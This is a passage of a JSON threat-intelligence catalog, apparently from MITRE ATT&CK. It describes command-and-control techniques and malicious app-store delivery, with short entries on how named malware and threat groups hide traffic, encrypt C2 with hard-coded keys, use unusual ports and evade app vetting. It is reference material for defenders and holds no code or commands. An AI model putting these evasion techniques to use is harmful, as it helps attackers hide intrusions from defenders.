            "Description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.\n",
            "ID": "T1071",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT uses HTTP for command and control.[1]"
                },
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT uses HTTP for command and control.[1]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL connects to port 80 of a C2 server using Wininet API.[2]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.[3][4]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as CHOPSTICK use a blend of HTTP and other legitimate channels, depending on module configuration.[5]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks.[6]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 uses HTTPS to conceal C2 communications.[7]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE uses HTTP as a transport to communicate with its command server.[8]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS establishes a backdoor over HTTP.[9]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot uses HTTP for command and control communication.[10]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.[11]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal uses HTTP for C2 communications.[12]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy communicates with its C2 server over HTTP.[13]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Some Brave Prince variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.[14]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER malware has used HTTP for C2.[15]"
                },
                {
                    "Name": "BUBBLEWRAP",
                    "Description": "BUBBLEWRAP can communicate using HTTP or HTTPS.[16]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "The Carbanak malware communicates to its command server using HTTP with an encrypted payload.[17]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.[18][19]"
                },
                {
                    "Name": "China Chopper",
                    "Description": "China Chopper executes code using HTTP POST commands.[20]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "Various implementations of CHOPSTICK communicate with C2 over HTTP, SMTP, and POP3.[21]"
                },
                {
                    "Name": "CloudDuke",
                    "Description": "One variant of CloudDuke uses HTTP and HTTPS for C2.[22]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used HTTPS and DNS tunneling for C2. The group has also used the Plink utility to create SSH tunnels.[23][24][25]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[26]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses HTTP for C2 communication.[27]"
                },
                {
                    "Name": "ComRAT",
                    "Description": "ComRAT has used HTTP requests for command and control.[28]"
                },
                {
                    "Name": "CORALDECK",
                    "Description": "CORALDECK has exfiltrated data in HTTP POST headers.[29]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL can communicate over HTTP, SMTP, and POP3 for C2.[5][30]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.[22][31]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.[32]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string \"&&&\"[33]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf uses HTTP for C2.[15]"
                },
                {
                    "Name": "DealersChoice",
                    "Description": "DealersChoice uses HTTP for communication with the C2 server.[34]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind uses HTTP for C2.[35]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper communicates to its C2 server over HTTP.[36]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used SMB for C2.[37]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[38]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky has used both HTTP and HTTPS for C2.[39]"
                },
                {
                    "Name": "Dyre",
                    "Description": "Dyre uses HTTPS for C2 communications.[40]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise communicates over HTTP or HTTPS for C2.[41]"
                },
                {
                    "Name": "ELMER",
                    "Description": "ELMER uses HTTP for command and control.[42]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary uses HTTP or HTTPS for C2.[43]"
                },
                {
                    "Name": "Epic",
                    "Description": "Epic implements a command and control protocol over HTTP.[44]"
                },
                {
                    "Name": "FakeM",
                    "Description": "Some variants of FakeM use SSL to communicate with C2 servers.[45]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus uses HTTP for C2.[46]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT uses HTTP and HTTPS to communicate with the C2 server.[47]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.[48]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has performed C2 using DNS via A, OPT, and TXT records.[49]"
                },
                {
                    "Name": "FLIPSIDE",
                    "Description": "FLIPSIDE uses RDP to tunnel traffic from a victim environment.[50]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "A Gamaredon Group file stealer can communicate over HTTP for C2.[51]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer communicates with its C2 servers over HTTP.[52]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke uses HTTP and HTTPS for command and control.[22]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon uses HTTP for communication to the control servers.[14]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT uses HTTP for C2.[53]"
                },
                {
                    "Name": "HAMMERTOSS",
                    "Description": "The \"Uploader\" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands.[54]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth can use HTTP or DNS for C2.[55]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor communicates with its C2 server over HTTPS.[56]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses FTP for command and control.[57]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser has used HTTP, HTTPS, and DNS for command and control.[58][59]"
                },
                {
                    "Name": "httpclient",
                    "Description": "httpclient uses HTTP for command and control.[1]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole uses HTTP for C2 communications.[60]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS.[61][62][63]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can communicate over FTP and send email over SMTP.[35]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar uses HTTP, HTTPS, FTP, and FTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API.[64]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2. Additionally, Ke3chang malware RoyalDNS has used DNS for C2.[65]"
                },
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap uses HTTPS for command and control.[66]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The Komplex C2 channel uses HTTP POST requests.[67]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Lazarus Group malware sample conducts C2 over HTTP.[68]"
                },
                {
                    "Name": "LOWBALL",
                    "Description": "LOWBALL command and control occurs via HTTPS over port 443.[16]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy uses HTTP for command and control.[69]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has used HTTP and IRC for C2.[70]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka uses DNS for C2.[71][72]"
                },
                {
                    "Name": "MiniDuke",
                    "Description": "MiniDuke uses HTTP and HTTPS for command and control.[22]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type network traffic can communicate over HTTP.[73]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs uses HTTPS for C2.[23]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu uses DNS for the C2 communications.[74]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT uses the email platform, Naver, for C2 communications, leveraging SMTP.[75]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519.[8]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.[63][76]"
                },
                {
                    "Name": "OLDBAIT",
                    "Description": "OLDBAIT can use HTTP or SMTP for C2.[5]"
                },
                {
                    "Name": "OnionDuke",
                    "Description": "OnionDuke uses HTTP and HTTPS for C2.[22]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE uses HTTP for C2 communications.[77][78]"
                },
                {
                    "Name": "Orangeworm",
                    "Description": "Orangeworm has used HTTP for C2.[79]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.[58]"
                },
                {
                    "Name": "PinchDuke",
                    "Description": "PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server.[22]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader uses DNS as its C2 protocol.[80]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can be configured to use HTTP or DNS for command and control.[58]"
                },
                {
                    "Name": "pngdowner",
                    "Description": "pngdowner uses HTTP for command and control.[1]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "POWERSOURCE uses DNS TXT records for C2.[81][82]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER can use HTTP and DNS for C2 communications.[83][76]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc uses HTTP over SSL to communicate commands with the control server.[84]"
                },
                {
                    "Name": "Psylo",
                    "Description": "Psylo uses HTTPS for C2.[45]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon can use HTTP for C2.[51]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests.[85][86]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can communicate over HTTP for C2.[87]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses HTTPS, HTTP, and DNS for C2 communications.[88]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor has used HTTP for C2.[89]"
                },
                {
                    "Name": "RARSTONE",
                    "Description": "RARSTONE uses SSL to encrypt its communication with its C2 server.[90]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses HTTP/HTTPS for command and control communication.[91][92]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Some Reaver variants use HTTP for C2.[93]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can communicate to its C2 over HTTP and HTTPS if directed.[94][95]"
                },
                {
                    "Name": "Regin",
                    "Description": "The Regin malware platform supports many standard protocols, including HTTP, HTTPS, and SMB.[96]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec is capable of using HTTP, HTTPS, SMTP, and DNS for C2.[97][98][99]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor uses HTTP for C2 communications.[100]"
                },
                {
                    "Name": "RIPTIDE",
                    "Description": "APT12 has used RIPTIDE, a RAT that uses HTTP to communicate.[101]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT use HTTPS for all command and control communication methods.[102]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type uses HTTP for C2.[73]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula uses HTTP for C2.[103]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke uses HTTP and HTTPS for C2.[22]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon uses HTTP for C2.[104]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader uses HTTP for C2.[105]"
                },
                {
                    "Name": "SNUGRIDE",
                    "Description": "SNUGRIDE communicates with its C2 server over HTTP.[94]"
                },
                {
                    "Name": "SOUNDBITE",
                    "Description": "SOUNDBITE communicates via DNS for C2.[106]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware communicates with its C2 server via HTTPS.[107]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 uses HTTP for C2.[108]"
                },
                {
                    "Name": "TEXTMATE",
                    "Description": "TEXTMATE uses DNS TXT records for C2.[81]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 malware has used HTTP for C2.[109]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.[110]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla has used HTTP and HTTPS for C2 communications.[111][112]"
                },
                {
                    "Name": "Umbreon",
                    "Description": "Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate.[113]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers.[114]"
                },
                {
                    "Name": "Vasport",
                    "Description": "Vasport creates a backdoor by making a connection using a HTTP POST.[115]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN uses HTTP for C2 communications.[116]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM uses HTTP for C2.[108]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.[117]"
                },
                {
                    "Name": "Zebrocy",
                    "Description": "After using raw sockets to communicate with its C2 server, Zebrocy uses a decrypted string to create HTTP POST requests.[118]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has used HTTP for C2.[119][120]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib communicates over HTTP for C2.[73]"
                }
            ]
        },
        "Standard Cryptographic Protocol": {
            "Name": "Standard Cryptographic Protocol",
            "Description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.\n",
            "ID": "T1032",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring, SSL/TLS inspection",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.[1]"
                },
                {
                    "Name": "adbupd",
                    "Description": "adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.[2]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "A variant of ADVSTORESHELL encrypts some C2 with 3DES and RSA.[3]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Some Bisonal samples encrypt C2 communications with RC4.[4]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.[5]"
                },
                {
                    "Name": "CallMe",
                    "Description": "CallMe uses AES to encrypt C2 traffic.[6]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode) and Base64 encoding.[7][8]"
                },
                {
                    "Name": "Chaos",
                    "Description": "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.[9]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes can encrypt C2 traffic with AES.[10][11]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK encrypts C2 communications with RC4 as well as TLS.[12]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used the Plink utility to create SSH tunnels.[13]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie encrypts command and control communications with RC4.[14]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf uses RC4 encryption to obfuscate HTTP traffic.[5]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind encrypts C2 data with AES256 in ECB mode.[2]"
                },
                {
                    "Name": "Downdelph",
                    "Description": "Downdelph uses RC4 to encrypt C2 responses.[15]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The Duqu command and control protocol's data stream can be encrypted with AES-CBC.[16]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise encrypts exfiltrated data with RC4.[17]"
                },
                {
                    "Name": "FakeM",
                    "Description": "Some variants of FakeM use RC4 to encrypt C2 traffic.[6]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Some Felismus samples use AES to encrypt C2 traffic.[18]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.[19]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.[20]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 encrypts C2 traffic using an RC4 key.[21]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth encrypts data sent to its C2 server over HTTP with RC4.[22]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can use SSL and TLS for communications.[23]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads.[24]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder uses AES to encrypt C2 communications.[6]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind encrypts C2 traffic using RC4 with a static key.[25]"
                },
                {
                    "Name": "NDiskMonitor",
                    "Description": "NDiskMonitor uses AES to encrypt certain information sent over its C2 channel.[26]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"[27]"
                },
                {
                    "Name": "Nidiran",
                    "Description": "Nidiran uses RC4 to encrypt C2 traffic.[28]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig used the Plink utility and other tools to create tunnels to C2 servers.[29]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy uses the Camellia cipher to encrypt communications.[30]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY encrypts C2 traffic with AES and RSA.[31]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS has encrypted C2 traffic with RSA.[32]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka encrypts some C2 traffic with the Blowfish cipher.[33]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.[34]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT uses AES to encrypt network communication.[35][36]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.[37]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec's network loader encrypts C2 traffic with RSA and RC6.[38]"
                },
                {
                    "Name": "RIPTIDE",
                    "Description": "APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.[39]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke C2 traffic has been encrypted with RC4 and AES.[40][41]"
                },
                {
                    "Name": "SNUGRIDE",
                    "Description": "SNUGRIDE encrypts C2 traffic using AES with a static key.[42]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.[43]"
                },
                {
                    "Name": "Taidoor",
                    "Description": "Taidoor uses RC4 to encrypt the message body of HTTP content.[44]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "Some versions of UPPERCUT have used the hard-coded string \"this is the encrypt key\" for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.[45]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Some Volgmer variants use SSL to encrypt C2 communications.[46]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel uses SSL/TLS and RC4 to encrypt traffic.[47][12]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has used RC4 to encrypt C2 traffic.[48][49]"
                }
            ]
        },
        "Standard Non-Application Layer Protocol": {
            "Name": "Standard Non-Application Layer Protocol",
            "Description": "Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. [1] Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; [2] however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n",
            "ID": "T1095",
            "Tactic": "Command And Control",
            "Platform: ": "Windows, Linux, macOS",
            "Data Sources: ": "Host network interface, Netflow/Enclave netflow, Network intrusion detection system, Network protocol analysis, Packet capture, Process use of network",
            "Requires Network: ": "Yes",
            "Contributors: ": "Ryan Becwar",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader establishes SOCKS5 connections for its initial C2.[3]"
                },
                {
                    "Name": "BUBBLEWRAP",
                    "Description": "BUBBLEWRAP can communicate using SOCKS.[4]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson uses a custom TCP protocol for C2.[5]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.[6]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type network traffic can communicate over a raw socket.[7]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat network traffic communicates over a raw socket.[7]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind completes network communication via raw sockets.[8]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[9]"
                },
                {
                    "Name": "PHOREAL",
                    "Description": "PHOREAL communicates via ICMP for C2.[10]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[11]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can be configured to use raw TCP or UDP for command and control.[12]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Some Reaver variants use raw TCP for C2.[13]"
                },
                {
                    "Name": "Regin",
                    "Description": "The Regin malware platform can use ICMP to communicate between infected computers.[14]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec is capable of using ICMP, TCP, and UDP for C2.[15][16]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD C2 traffic can communicate via TCP raw sockets.[10]"
                }
            ]
        },
        "Uncommonly Used Port": {
            "Name": "Uncommonly Used Port",
            "Description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.\n",
            "ID": "T1065",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Netflow/Enclave netflow, Process use of network, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.[1]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot binds and listens on port 1058.[2]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group has used a variant of NanoCore RAT that communicates with its C2 server over port 6666.[3]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT uses port 46769 for C2.[4]"
                },
                {
                    "Name": "Group5",
                    "Description": "Group5 C2 servers communicated with malware over TCP 8081, 8282, and 8083.[5]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT uses port 52100 and 5876 for C2 communications.[6]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.[7][8]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has communicated with its C2 server over ports 4443 and 3543.[9]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder communicates with its C2 server over TCP port 3728.[10]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy opens a backdoor on TCP ports 6868 and 7777.[11]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS has used ports 8060 and 8888 for C2.[12]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can use port 995 for C2.[13]"
                },
                {
                    "Name": "Remsec",
                    "Description": "A Remsec module has a default C2 port of 13000.[14]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses ports 447 and 8082 for C2 communications.[15][16][17]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "A TYPEFRAME variant can use port 127 for communications.[18]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Some Volgmer variants use port 8088 for C2.[19][20][21]"
                }
            ]
        }
    },
    "Mobile": {
        "Deliver Malicious App via Authorized App Store": {
            "Name": "Deliver Malicious App via Authorized App Store",
            "Description": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.App stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:Download New Code at RuntimeObfuscated or Encrypted PayloadPRE-ATT&CK: Choose pre-compromised mobile app developer account credentials or signing keysPRE-ATT&CK: Test ability to evade automated mobile application security analysis performed by app storesAdversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis. [1] [2] [3] [4]Adversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. [2]Adversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account. [5] [6] (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)\n",
            "ID": "T1475",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "ECO-4, ECO-16, ECO-17, APP-20, APP-21, ECO-22",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "App store operators and enterprises could assess reputational characteristics of the app, including the popularity of the app or other apps from the same developer and whether or not security issues have been found in other apps from the same developer."
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "Encourage developers to protect their account credentials and enable multi-factor authentication if available. Encourage developers to protect their signing keys."
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android attempts to detect whether it is running in an emulator rather than a real device.[7]"
                },
                {
                    "Name": "ZergHelper",
                    "Description": "ZergHelper apparently evaded Apple's app review process by performing different behaviors for users from different physical locations (e.g. performing differently for users in China versus outside of China), which could have bypassed the review process depending on the country from which it was performed.[8]"
                }
            ]
        },
